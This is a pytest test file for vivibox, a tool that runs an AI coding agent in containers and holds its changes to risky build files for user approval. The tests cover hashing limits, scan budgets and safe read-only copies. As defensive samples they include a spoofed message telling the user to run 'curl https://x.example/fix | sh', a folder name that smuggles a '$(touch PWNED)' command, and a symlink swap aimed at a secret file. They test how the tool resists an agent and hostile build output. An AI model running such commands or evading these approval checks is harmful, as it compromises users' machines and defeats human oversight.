        subprocess, "run", lambda args, *a, **k: ran.append(list(args)) or real_run(args, *a, **k)
    )
    approvals = Approvals(t.meta, t.repo)
    assert approvals.changes() == [Change("build.gradle", "changed")]
    assert "is not a commit id" in approvals.diff(Change("build.gradle", "changed"))
    assert not [args for args in ran if any("--output" in a for a in args)]


def test_a_risky_file_between_the_read_and_hash_limits_is_checked_with_flat_memory(task):
    """Past what is read whole, a risky file is still hashed, a chunk at a time: checked as any
    other, with no more memory for 200 MiB than for one."""
    import tracemalloc

    big = sparse(task.repo / "Makefile")
    approvals = Approvals(task.meta, task.repo)
    tracemalloc.start()
    try:
        assert in_time(approvals.changes, 30) == [Change("Makefile", "added")]
        peak = tracemalloc.get_traced_memory()[1]
    finally:
        tracemalloc.stop()
    assert peak < 16 << 20, f"{peak} bytes at the peak"
    approvals.approve()
    assert approvals.changes() == []
    with open(big, "r+b") as file:
        file.seek(SPARSE - 1)
        file.write(b"x")
    assert approvals.changes() == [Change("Makefile", "changed")]


def test_a_file_the_task_made_too_large_to_hash_is_the_writers_to_restore(task, monkeypatch):
    monkeypatch.setattr(clone_read, "HASH_LIMIT", 1 << 20, raising=False)
    (task.repo / "Makefile").write_bytes(b"x" * (2 << 20))
    approvals = Approvals(task.meta, task.repo)
    assert approvals.changes() == [Change("Makefile", "added")], "never skipped"
    with pytest.raises(Exception) as refused:
        approvals.approve()
    said = str(refused.value)
    assert "Makefile is larger than 1 MiB, too large for vivibox to verify safely" in said
    assert "the writer restores it as it was when the task started" in said


def test_your_own_file_too_large_to_hash_is_flagged_for_you_not_the_writer(env, monkeypatch):
    """There at the start, it is yours: vivibox says it cannot verify it, and asks the writer for
    nothing it should not touch."""
    monkeypatch.setattr(clone_read, "HASH_LIMIT", 1 << 20, raising=False)
    source = env / "repo"
    (source / "Makefile").write_bytes(b"x" * (2 << 20))
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Add the build")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()  # the task's start: your repository as it is
    assert approvals.changes() == [Change("Makefile", "changed")], "never taken as checked"
    said = approvals.diff(Change("Makefile", "changed"))
    assert "too large for vivibox to verify safely" in said
    assert "was that large in your repository when the task started" in said
    assert "writer" not in said


# --- review round 3 ------------------------------------------------------------------------------


def test_a_file_that_grows_while_it_is_hashed_is_read_no_further_than_the_limit(clone, monkeypatch):
    """Its size, as fstat said it, was small; what is read is counted all the same."""
    monkeypatch.setattr(clone_read, "HASH_LIMIT", 1 << 20)
    (clone / "Makefile").write_bytes(b"x" * (3 << 20))
    real_fstat = os.fstat

    def small(fd):
        fields = list(real_fstat(fd))
        fields[6] = 10  # st_size, as if it grew after the look
        return os.stat_result(fields)

    monkeypatch.setattr(os, "fstat", small)
    before = bytes_read()
    digest = risky._digest(clone, clone / "Makefile")
    assert bytes_read() - before < (1 << 20) + (256 << 10), "the limit and one byte, at most"
    assert digest == f"{risky.TOO_LARGE}larger than 1 MiB"


def test_a_risky_file_too_large_to_show_says_where_to_read_it(task):
    """Hashed and watched, but not shown: you are told so, and where to read it before p."""
    sparse(task.repo / "build.gradle")
    approvals = Approvals(task.meta, task.repo)
    said = approvals.diff(Change("build.gradle", "added"))
    assert "larger than 64 MiB, too large to show here" in said
    assert "vivibox checks whether it changes, not what it says" in said
    assert shlex.join(["less", "-L", str(task.meta / "risky" / "view" / "build.gradle")]) in said
    assert "does not read it" not in said


def your_huge_makefile(env, monkeypatch) -> tuple:
    monkeypatch.setattr(clone_read, "HASH_LIMIT", 1 << 20)
    source = env / "repo"
    (source / "Makefile").write_bytes(b"x" * (2 << 20))
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Add the build")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()
    return t, approvals


def test_your_own_file_too_large_to_hash_says_what_can_be_done(env, monkeypatch):
    t, approvals = your_huge_makefile(env, monkeypatch)
    said = approvals.diff(Change("Makefile", "changed"))
    assert "no task of this project can be approved while it is that large" in said
    assert f"vivibox delete {t.id}" in said and "writer" not in said


def test_a_file_the_task_added_too_large_is_the_writers_to_remove(env, monkeypatch):
    monkeypatch.setattr(clone_read, "HASH_LIMIT", 1 << 20)
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(env / "repo", t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()
    (t.repo / "Makefile").write_bytes(b"x" * (2 << 20))
    said = approvals.diff(Change("Makefile", "added"))
    assert "reply, and the writer removes it" in said and "restores" not in said


def test_a_file_the_task_made_too_large_is_the_writers_to_restore(env, monkeypatch):
    monkeypatch.setattr(clone_read, "HASH_LIMIT", 1 << 20)
    source = env / "repo"
    (source / "Makefile").write_text("test:\n\ttrue\n")
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Add the build")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()
    (t.repo / "Makefile").write_bytes(b"x" * (2 << 20))
    said = approvals.diff(Change("Makefile", "changed"))
    assert "reply, and the writer restores it as it was when the task started" in said
    assert "removes it" not in said


@pytest.mark.parametrize(
    "fails, words",
    [
        ("dubious", "fatal: detected dubious ownership in repository at"),
        ("missing", "git could not run"),
    ],
)
def test_a_git_failure_in_your_checkout_is_said_in_its_own_words(env, outside, monkeypatch, fails, words):
    from vivibox import baseline

    t, _ = linked_at_base(env, outside)
    real_run = subprocess.run

    def run(args, *a, **k):
        if "ls-tree" not in args:
            return real_run(args, *a, **k)
        if fails == "missing":
            raise FileNotFoundError(2, "No such file or directory", "git")
        said = b"fatal: detected dubious ownership in repository at '/x'\nTo add an exception: ...\n"
        return subprocess.CompletedProcess(args, 128, b"", said)

    monkeypatch.setattr(baseline.subprocess, "run", run)
    said = Approvals(t.meta, t.repo).diff(Change("build.gradle", "changed"))
    assert words in said and "To add an exception" not in said, "its first line"


def test_a_project_file_renamed_or_unreadable_is_a_reason_with_the_right_next_step(env, outside, monkeypatch):
    from vivibox import config

    t, _ = linked_at_base(env, outside)
    projects = Path(os.environ["VIVIBOX_CONFIG_DIR"]) / "projects"
    (projects / "demo.toml").rename(projects / "renamed.toml")
    said = Approvals(t.meta, t.repo).diff(Change("build.gradle", "changed"))
    assert f"the project file {projects / 'demo.toml'} is gone" in said
    assert "give it its name back" in said and "run vivibox to set it up" not in said
    (projects / "renamed.toml").rename(projects / "demo.toml")

    def unreadable(name, base=None):
        raise PermissionError(13, "Permission denied", str(projects / "demo.toml"))

    monkeypatch.setattr(config, "load_project", unreadable)
    approvals = Approvals(t.meta, t.repo)
    assert approvals.changes() == [Change("build.gradle", "changed")], "a reason, not an exception"
    assert "Permission denied" in approvals.diff(Change("build.gradle", "changed"))


# --- review round 4 ------------------------------------------------------------------------------


def your_linked_gradle(env, monkeypatch) -> tuple:
    """Your build.gradle and settings.gradle are links to gradle/main.gradle at the base commit."""
    monkeypatch.setattr(clone_read, "HASH_LIMIT", 1 << 20)
    source = env / "repo"
    (source / "gradle").mkdir()
    (source / "gradle" / "main.gradle").write_text("apply plugin: 'java'\n")
    for name in ("build.gradle", "settings.gradle"):
        (source / name).symlink_to("gradle/main.gradle")
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Share the build")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()
    return t, approvals


def test_your_link_whose_file_the_task_made_too_large_is_restored_not_removed(env, monkeypatch):
    t, approvals = your_linked_gradle(env, monkeypatch)
    (t.repo / "gradle" / "main.gradle").write_bytes(b"x" * (2 << 20))
    for name in ("build.gradle", "settings.gradle", "gradle/main.gradle"):
        said = approvals.diff(Change(name, "changed"))
        assert "the writer restores it as it was when the task started" in said, name
        assert "removes it" not in said, name


def test_your_link_the_task_replaced_with_a_large_file_is_restored_not_removed(env, monkeypatch):
    t, approvals = your_linked_gradle(env, monkeypatch)
    (t.repo / "settings.gradle").unlink()
    (t.repo / "settings.gradle").write_bytes(b"x" * (2 << 20))
    said = approvals.diff(Change("settings.gradle", "changed"))
    assert "the writer restores it as it was when the task started" in said and "removes it" not in said


def test_a_risky_file_too_large_to_show_is_copied_for_you_as_a_plain_file(task):
    """Read where the agent cannot change it or put a link in its place, and as text: a build
    file opened in your IDE is what the approval is there to prevent."""
    big = sparse(task.repo / "build.gradle")
    with open(big, "r+b") as file:
        file.write(b"plugins { id 'java' }\n")
    said = Approvals(task.meta, task.repo).diff(Change("build.gradle", "added"))
    view = task.meta / "risky" / "view" / "build.gradle"
    assert shlex.join(["less", "-L", str(view)]) in said and "not in your IDE" in said
    assert str(task.repo) not in said
    assert view.is_file() and not view.is_symlink()
    assert risky._digest(task.meta / "risky" / "view", view) == risky._digest(task.repo, big)


def test_a_risky_file_swapped_for_a_link_before_its_copy_is_not_copied(task, outside, monkeypatch):
    big = sparse(task.repo / "build.gradle")
    real_read = clone_read.read_bytes

    def read_then_swap(root, path, *args, **kwargs):
        try:
            return real_read(root, path, *args, **kwargs)
        finally:
            if Path(path) == big and not big.is_symlink():
                big.unlink()
                big.symlink_to(outside / "secret.txt")

    monkeypatch.setattr(clone_read, "read_bytes", read_then_swap)
    said = Approvals(task.meta, task.repo).diff(Change("build.gradle", "added"))
    view = task.meta / "risky" / "view" / "build.gradle"
    assert "could not copy it for you to read" in said and "less " not in said
    assert not view.is_symlink() and not (view.exists() and SECRET in view.read_text())


def test_the_copies_for_you_are_in_no_containers_writable_mount(env, monkeypatch):
    """The agent, the verification, the sidecar and the reviewer: none of them can write there."""
    from vivibox import actions, opencode, providers, secrets
    from vivibox.config import load_config

    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(env / "repo", t.repo, t.id, t.meta))
    the_pod = actions.task_pod(t.id)
    reviewer = []
    monkeypatch.setattr(secrets, "prepare", lambda *a, **k: env / "runtime")
    monkeypatch.setattr(providers, "mcp_secrets", lambda: [])
    monkeypatch.setattr(opencode, "provider_of", lambda model: "ollama")
    monkeypatch.setattr(providers, "keyless", lambda provider: True)
    monkeypatch.setattr(the_pod, "review_fresh", lambda: the_pod.review_dir.mkdir(parents=True))
    monkeypatch.setattr(the_pod, "review_start", lambda mounts, env_: reviewer.append(mounts))
    reviewing.up(t, the_pod, load_config())
    argvs = [
        the_pod.agent_command(),
        the_pod.gate_command(),
        the_pod.sidecar_command(),
        the_pod.review_command(reviewer[0], {}),
    ]
    view = Approvals(t.meta, t.repo).copy_for_you("build.gradle")  # where _view puts it
    for argv in argvs:
        for bind in (argv[i + 1] for i, a in enumerate(argv) if a == "-v"):
            source, _, rest = bind.partition(":")
            if not source.startswith("/") or rest.endswith(":ro"):
                continue  # a volume, or read-only
            assert not view.is_relative_to(source), f"{bind} would let a container write {view}"


# --- review round 5 ------------------------------------------------------------------------------


def test_the_command_to_read_a_large_risky_file_is_quoted_whatever_its_name(task, tmp_path):
    """The agent names the folders under buildSrc/: a name is never part of a command you paste."""
    folder = "$(touch PWNED) it's; x"
    rel = f"buildSrc/{folder}/x.gradle"
    sparse(task.repo / rel)
    said = Approvals(task.meta, task.repo).diff(Change(rel, "added"))
    command = said[said.index("(less") + 1 : said.rindex("), before you approve")]
    assert shlex.split(command) == ["less", "-L", str(task.meta / "risky" / "view" / rel)]
    stub = tmp_path / "bin"
    stub.mkdir()
    (stub / "less").write_text("#!/bin/sh\nexit 0\n")
    (stub / "less").chmod(0o755)
    path = f"{stub}:{os.environ['PATH']}"
    subprocess.run(["bash", "-c", command], cwd=tmp_path, env={**os.environ, "PATH": path}, check=True)
    assert not (tmp_path / "PWNED").exists()


@pytest.mark.parametrize("then", ["a FIFO", "small"])
def test_a_copy_for_you_never_outlives_the_file_it_was_made_of(task, then):
    big = sparse(task.repo / "build.gradle")
    with open(big, "r+b") as file:
        file.write(b"OLD CONTENT\n")
    approvals = Approvals(task.meta, task.repo)
    approvals.diff(Change("build.gradle", "added"))
    view = task.meta / "risky" / "view" / "build.gradle"
    assert view.is_file()
    big.unlink()
    if then == "a FIFO":
        os.mkfifo(big)
    else:
        big.write_text("plugins { id 'java' }\n")
    in_time(lambda: approvals.diff(Change("build.gradle", "added")))
    assert not view.exists(), "no old content shown as the file's"


# --- the scan's budget ---------------------------------------------------------------------------

MiB = 1 << 20
FIVE = [f"buildSrc/f{i}.gradle" for i in range(5)]


def five_of_a_mib(root: Path, monkeypatch, names=FIVE) -> list[str]:
    """Five files of 1 MiB, each far under its limits, and a budget of 3 MiB for one pass."""
    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 3 * MiB, raising=False)
    for name in names:
        (root / name).parent.mkdir(parents=True, exist_ok=True)
        (root / name).write_bytes(b"x" * MiB)
    return list(names)


def read_per_file(monkeypatch, root: Path) -> dict[str, int]:
    """What each file of root gave of its content, to a hash, a read or a copy."""
    read: dict[str, int] = {}
    real = clone_read._chunks

    def counting(top, path, *args, **kwargs):
        rel = Path(os.path.abspath(path)).relative_to(root).as_posix()
        for chunk in real(top, path, *args, **kwargs):
            read[rel] = read.get(rel, 0) + len(chunk)
            yield chunk

    monkeypatch.setattr(clone_read, "_chunks", counting)
    return read


def hashed_per_file(monkeypatch, root: Path) -> dict[str, int]:
    """How many times each file of root was hashed."""
    hashed: dict[str, int] = {}
    real = clone_read.sha256

    def counting(top, path, *args, **kwargs):
        rel = Path(os.path.abspath(path)).relative_to(root).as_posix()
        hashed[rel] = hashed.get(rel, 0) + 1
        return real(top, path, *args, **kwargs)

    monkeypatch.setattr(clone_read, "sha256", counting)
    return hashed


def test_files_each_under_their_limits_together_past_the_budget_are_not_checked(task, monkeypatch):
    names = five_of_a_mib(task.repo, monkeypatch)
    now = risky.scan(task.repo)
    assert [now[n] for n in names[3:]] == [f"{risky.UNCHECKED}{clone_read.OVER_BUDGET}"] * 2
    assert not any(now[n].startswith(risky.UNCHECKED) for n in names[:3])
    approvals = Approvals(task.meta, task.repo)
    before = approvals.approved()
    assert approvals.changes() == [Change(n, "added") for n in names]
    with pytest.raises(risky.Unapprovable) as refused:
        approvals.approve()
    said = str(refused.value)
    assert f"{names[3]} was not checked: scan budget exceeded" in said and names[4] in said
    assert names[0] not in said
    assert approvals.approved() == before, "nothing taken"


def test_a_file_past_the_budget_stays_a_change_though_it_was_approved(task, monkeypatch):
    names = five_of_a_mib(task.repo, monkeypatch)
    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 8 * MiB)
    approvals = Approvals(task.meta, task.repo)
    approvals.approve()
    assert approvals.changes() == []
    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 3 * MiB)
    assert approvals.changes() == [Change(n, "changed") for n in names[3:]], "never taken as checked"


def test_once_the_budget_is_spent_no_further_risky_file_is_read_or_hashed(task, monkeypatch):
    names = five_of_a_mib(task.repo, monkeypatch)
    read = read_per_file(monkeypatch, task.repo)
    risky.scan(task.repo)
    assert [n for n in names if read.get(n)] == names[:3]
    assert sum(read.values()) <= 3 * MiB


def test_once_the_budget_is_spent_no_further_untracked_file_is_read(task, monkeypatch):
    names = five_of_a_mib(task.repo, monkeypatch, [f"notes{i}.txt" for i in range(5)])
    read = read_per_file(monkeypatch, task.repo)
    found = gate.hidden_characters(task.repo, task.read_state().base_commit)
    assert [n for n in names if read.get(n)] == names[:3]
    assert found == [
        f"{n}: vivibox does not read it (scan budget exceeded), so it was not checked" for n in names[3:]
    ]


def test_a_verification_past_the_budget_is_not_passed_and_says_why(task, monkeypatch, capsys):
    from test_gate import tick

    gate.accept_plan(task)
    tick(task, "endpoint returns 200", "error path is tested")
    names = five_of_a_mib(task.repo, monkeypatch, [f"notes{i}.txt" for i in range(5)])
    result = gate.run_gate(task, FakePod(), ["true"], [])
    assert not result.passed
    unread = [
        f"{n}: vivibox does not read it (scan budget exceeded), so it was not checked" for n in names[3:]
    ]
    assert clone_read.split_checked(result.hidden_characters)[1] == unread
    assert "2 files not checked" in gate.why_red(result)
    from vivibox import feedback

    assert f"- {unread[0]}" in feedback.feedback(result)


def test_risky_files_past_the_budget_stop_the_verification_for_you(task, monkeypatch):
    """Not passed, and no round of the writer's: the files may be yours."""
    from test_gate import tick
    from test_supervisor import FakeHarness, make

    gate.accept_plan(task)
    tick(task, "endpoint returns 200", "error path is tested")
    names = five_of_a_mib(task.repo, monkeypatch)
    git(task.repo, "add", "buildSrc")
    git(task.repo, "commit", "-q", "-m", "Add the build's sources")
    result = gate.run_gate(task, FakePod(), ["true"], [])
    assert [c.path for c in result.risky] == names
    assert not result.passed
    assert list(result.risky_stopped) == names[3:] and not result.environment
    assert gate.next_state(result, 1, 3) is State.CHECKPOINT_BLOCKED
    with pytest.raises(risky.Unapprovable, match="scan budget exceeded"):
        Approvals(task.meta, task.repo).approve()
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
        task.transition(state)
    rounds = task.read_state().rounds
    sup, notes = make(task, FakeHarness(task), results=[result])
    sup.step()  # implement
    sup.step()  # verify
    st = task.read_state()
    assert (st.state, st.rounds) == (State.CHECKPOINT_BLOCKED, rounds), "no round spent"
    assert "scan budget exceeded" in notes[-1]


def test_the_view_hashes_each_risky_file_once_for_the_listing_and_the_diffs(task, monkeypatch):
    from vivibox import actions

    names = [f"buildSrc/big{i}.gradle" for i in range(3)]
    for name in names:
        sparse(task.repo / name, 70 << 20)
    hashed = hashed_per_file(monkeypatch, task.repo)
    diffs = actions.risky_diffs(task, SimpleNamespace(risky_extra=[]))
    assert hashed == dict.fromkeys(names, 1)
    assert len(diffs) == 3 and all("too large to show here" in d and "less -L" in d for d in diffs)


def test_p_after_a_view_with_files_not_checked_approves_none_of_them(task, monkeypatch):
    from vivibox import actions

    names = five_of_a_mib(task.repo, monkeypatch)
    project = SimpleNamespace(risky_extra=[])
    diffs = actions.risky_diffs(task, project)
    assert [("was not checked" in d, "not shown" in d) for d in diffs] == [(False, True)] * 3 + [
        (True, False)
    ] * 2
    assert all("scan budget exceeded" in d for d in diffs)
    before = Approvals(task.meta, task.repo).approved()
    hashed = hashed_per_file(monkeypatch, task.repo)
    with pytest.raises(risky.Unapprovable, match="scan budget exceeded"):
        actions.approve_risky(task, project)
    assert Approvals(task.meta, task.repo).approved() == before
    assert hashed == dict.fromkeys(names, 1), "one scan: what p counts is what it approves"


def test_a_task_past_the_budget_is_the_writers_to_undo(env, monkeypatch):
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(env / "repo", t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()
    names = five_of_a_mib(t.repo, monkeypatch)
    said = approvals.diffs()[3]  # as the view shows it: from one scan
    assert f"{names[3]} was not checked: scan budget exceeded" in said
    assert "more than vivibox reads at a time (3 MiB)" in said
    assert "reply, and the writer restores the large risky files it changed as they were when the" in said
    assert "removes the ones it added" in said and "could not tell" not in said


def test_your_own_risky_files_past_the_budget_are_flagged_for_you_not_the_writer(env, monkeypatch):
    source = env / "repo"
    names = five_of_a_mib(source, monkeypatch)
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Add the build's sources")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()  # the task's start: your repository as it is
    assert approvals.changes() == [Change(n, "changed") for n in names[3:]], "never taken as checked"
    said = approvals.diffs()[0]
    assert "Your repository's risky files together were more than vivibox reads at a time" in said
    assert "no task of this project can be approved while they are that large" in said
    assert f"vivibox delete {t.id}" in said and "writer" not in said


def test_a_copy_for_you_past_the_budget_says_so(task, monkeypatch):
    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 100 << 20, raising=False)
    sparse(task.repo / "build.gradle", 70 << 20)
    said = "\n".join(actions_diffs(task))
    assert "could not copy it for you to read: scan budget exceeded" in said
    assert not (task.meta / "risky" / "view" / "build.gradle").exists()


def actions_diffs(task) -> list[str]:
    from vivibox import actions

    return actions.risky_diffs(task, SimpleNamespace(risky_extra=[]))


# --- review round 7 ------------------------------------------------------------------------------


def test_the_budget_notification_is_one_whole_sentence_with_a_way_out(task, monkeypatch):
    from test_gate import tick
    from test_supervisor import FakeHarness, make

    gate.accept_plan(task)
    tick(task, "endpoint returns 200", "error path is tested")
    five_of_a_mib(task.repo, monkeypatch)
    git(task.repo, "add", "buildSrc")
    git(task.repo, "commit", "-q", "-m", "Add the build's sources")
    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
        task.transition(state)
    sup, notes = make(task, FakeHarness(task), results=[gate.run_gate(task, FakePod(), ["true"], [])])
    sup.step()  # implement
    sup.step()  # verify
    assert notes[-1].startswith(
        "verification could not run: 2 risky files not checked, scan budget exceeded (3 MiB): vivibox "
        "could not tell whose they are: the project file "
    )
    assert notes[-1].endswith("is gone; if you renamed it, give it its name back"), "whole, no g"


def test_your_own_risky_files_past_the_budget_say_delete_in_one_sentence(env, monkeypatch):
    source = env / "repo"
    five_of_a_mib(source, monkeypatch)
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Add the build's sources")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()
    assert risky.stop_said(approvals.verified()[1], t.id) == (
        "2 risky files not checked, scan budget exceeded (3 MiB): your own risky files are that large, "
        f"so no task of this project can be approved: vivibox delete {t.id}"
    )


def test_the_writer_is_told_of_the_budget_as_the_writers_concern(tmp_path, monkeypatch):
    from vivibox import feedback

    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 3 * MiB)
    result = gate.GateResult(tmp_path / "verify-1.log", risky_stopped=dict.fromkeys(FIVE[3:], risky.WRITERS))
    said = feedback.feedback(result)
    assert "reply" not in said and "the writer" not in said
    assert f"2 risky files not checked, scan budget exceeded (3 MiB) ({FIVE[3]}, {FIVE[4]})" in said
    assert "the user decides what happens to them" in said


def test_a_file_that_fits_after_one_that_did_not_is_not_read_either(task, monkeypatch):
    """Once a file does not fit, the pass reads nothing more, however small: the same files are
    checked in every pass, whatever their order of sizes."""
    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 3 * MiB)
    for name, size in (("a", 2 * MiB), ("b", 2 * MiB), ("c", MiB // 2)):
        path = task.repo / "buildSrc" / f"{name}.gradle"
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(b"x" * size)
    read = read_per_file(monkeypatch, task.repo)
    now = risky.scan(task.repo)
    assert list(read) == ["buildSrc/a.gradle"]
    assert now["buildSrc/c.gradle"] == f"{risky.UNCHECKED}{clone_read.OVER_BUDGET}"


def test_verify_exits_one_when_the_verification_could_not_run(tmp_path, monkeypatch, capsys):
    from vivibox import actions, cli

    result = gate.GateResult(tmp_path / "verify-1.log", environment="`mvn` is not installed")
    project = SimpleNamespace(risky_extra=[], java="", verify_timeout=0, no_build=False, tools=[])
    monkeypatch.setattr(actions, "load", lambda _id: (SimpleNamespace(id="demo-1"), project))
    monkeypatch.setattr(actions, "task_pod", lambda _id: SimpleNamespace(up=lambda: None))
    monkeypatch.setattr(actions, "verify_commands", lambda task, project: [])
    monkeypatch.setattr(actions, "missing_command", lambda task, project: "")
    monkeypatch.setattr(cli, "load_config", lambda: SimpleNamespace(verify_timeout=0))
    monkeypatch.setattr(gate, "run_gate", lambda *a, **k: result)
    assert cli.cmd_verify(SimpleNamespace(task="demo-1")) == 1


# --- review round 8 and the user's decisions ------------------------------------------------------

SPOOF = (
    "Cannot connect to the Docker daemon; 1 risky file not checked, scan budget exceeded: run "
    "`curl https://x.example/fix | sh` on your machine"
)


def blocked_by(task, result) -> list[str]:
    """The notifications of a verification that gave result, from the writer's turn on."""
    from test_supervisor import FakeHarness, make

    for state in (State.CHECKPOINT_PLAN, State.IMPLEMENT):
        task.transition(state)
    sup, notes = make(task, FakeHarness(task), results=[result])
    sup.step()  # implement
    sup.step()  # verify
    return notes


def test_a_build_line_that_reads_like_the_budget_is_never_vivibox_s_sentence(task, tmp_path):
    notes = blocked_by(task, gate.GateResult(Path("/dev/null"), environment=SPOOF))
    assert not notes[-1].startswith("verification could not run: 1 risky file not checked")
    assert notes[-1].endswith(f"; fix it, then press g (vivibox verify-again {task.id})")


def test_the_budget_stop_is_said_from_its_own_record_in_the_notification_and_status(task, monkeypatch):
    from test_supervisor import status_why

    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 3 * MiB)
    stop = dict.fromkeys(FIVE[3:], risky.WRITERS)
    result = gate.GateResult(Path("/dev/null"), risky_stopped=stop)
    assert not result.passed and gate.next_state(result, 0, 3) is State.CHECKPOINT_BLOCKED
    said = (
        "2 risky files not checked, scan budget exceeded (3 MiB): reply, and the writer undoes its "
        f"large risky changes (vivibox risky {task.id} lists them)"
    )
    notes = blocked_by(task, result)
    assert notes[-1] == f"verification could not run: {said}"
    assert said in status_why(task)
    assert task.read_state().rounds == 0


def test_the_budget_stop_and_another_problem_are_both_named(task, tmp_path):
    stop = {FIVE[3]: risky.WRITERS}
    refused = "handoff/criteria.md is a link or not a plain file, and vivibox does not read through one"
    notes = blocked_by(task, gate.GateResult(Path("/dev/null"), environment=refused, risky_stopped=stop))
    assert notes[-1].startswith("verification could not run: 1 risky file not checked")
    assert notes[-1].endswith(f"; and more, see vivibox status {task.id}")


def test_your_files_past_the_budget_with_a_base_vivibox_cannot_read_say_why(env, monkeypatch):
    source = env / "repo"
    five_of_a_mib(source, monkeypatch)
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Add the build's sources")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    approvals = Approvals(t.meta, t.repo)
    approvals.approve()
    projects = Path(os.environ["VIVIBOX_CONFIG_DIR"]) / "projects"
    (projects / "demo.toml").rename(projects / "renamed.toml")
    said = risky.stop_said(approvals.verified()[1], t.id)
    assert said.startswith("2 risky files not checked, scan budget exceeded (3 MiB): vivibox could not")
    assert "tell whose they are: the project file" in said and "give it its name back" in said
    assert "reply" not in said


def test_one_verification_reads_its_risky_and_untracked_files_from_one_budget(task, monkeypatch):
    from test_gate import tick

    gate.accept_plan(task)
    tick(task, "endpoint returns 200", "error path is tested")
    five_of_a_mib(task.repo, monkeypatch, FIVE[:2])
    git(task.repo, "add", "buildSrc")
    git(task.repo, "commit", "-q", "-m", "Add the build's sources")
    notes = five_of_a_mib(task.repo, monkeypatch, [f"notes{i}.txt" for i in range(3)])
    read = read_per_file(monkeypatch, task.repo)
    result = gate.run_gate(task, FakePod(), ["true"], [])
    assert sum(read.values()) <= 3 * MiB
    assert not result.risky_stopped and [n for n in notes if read.get(n)] == notes[:1]
    assert clone_read.split_checked(result.hidden_characters)[1] == [
        f"{n}: vivibox does not read it (scan budget exceeded), so it was not checked" for n in notes[1:]
    ]
    assert not result.passed


def changed_risky(task, name: str, size: int) -> Path:
    """A risky file the task changed: there at the start, then size bytes of other content."""
    path = task.repo / name
    path.write_text("plugins {}\n")
    Approvals(task.meta, task.repo).approve()
    sparse(path, size)
    with open(path, "r+b") as file:
        file.write(b"plugins { id 'java' }\n")
    return path


@pytest.mark.parametrize("size", [1 << 10, 70 << 20], ids=["shown as a diff", "copied for you"])
def test_a_change_vivibox_can_show_you_is_approvable(task, size):
    from vivibox import actions

    changed_risky(task, "build.gradle", size)
    assert actions.approve_risky(task, SimpleNamespace(risky_extra=[]))[0] == 1


def test_a_change_vivibox_cannot_show_you_is_refused_at_p(task, monkeypatch):
    from vivibox import actions

    changed_risky(task, "build.gradle", 70 << 20)
    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 100 << 20)  # the hash fits, its copy does not
    said = "\n".join(actions.risky_diffs(task, SimpleNamespace(risky_extra=[])))
    assert "could not copy it for you to read: scan budget exceeded" in said
    assert "so the task's change to it cannot be approved: reply, and the writer" in said
    before = Approvals(task.meta, task.repo).approved()
    with pytest.raises(risky.Unapprovable) as refused:
        actions.approve_risky(task, SimpleNamespace(risky_extra=[]))
    assert "build.gradle" in str(refused.value) and "could not copy it for you to read" in str(refused.value)
    assert Approvals(task.meta, task.repo).approved() == before


def test_a_small_change_not_shown_for_the_budget_is_refused_at_p_too(task, monkeypatch):
    from vivibox import actions

    names = five_of_a_mib(task.repo, monkeypatch)
    said = actions.risky_diffs(task, SimpleNamespace(risky_extra=[]))[0]
    assert said.startswith(f"{names[0]}: added: not shown: scan budget exceeded")
    assert "so the task's change to it cannot be approved: reply, and the writer restores it as it" in said
    with pytest.raises(risky.Unapprovable, match=f"{names[0]}: added: not shown"):
        actions.approve_risky(task, SimpleNamespace(risky_extra=[]))


def test_your_unchanged_file_past_the_limits_is_not_held_to_being_shown(env, monkeypatch):
    from vivibox import actions

    monkeypatch.setattr(clone_read, "SCAN_BUDGET", 100 << 20)
    source = env / "repo"
    sparse(source / "Makefile", 70 << 20)
    git(source, "add", ".")
    git(source, "commit", "-q", "-m", "Add the build")
    t = create_task(env / "tasks", "demo", "goal", PLAN)
    t.set_base_commit(repo.prepare(source, t.repo, t.id, t.meta))
    Approvals(t.meta, t.repo).approve()
    (t.repo / "pom.xml").write_text("<project/>\n")
    assert actions.approve_risky(t, SimpleNamespace(risky_extra=[]))[0] == 1


# --- review round 9: what you approve is what vivibox showed you -----------------------------------

P = SimpleNamespace(risky_extra=[])


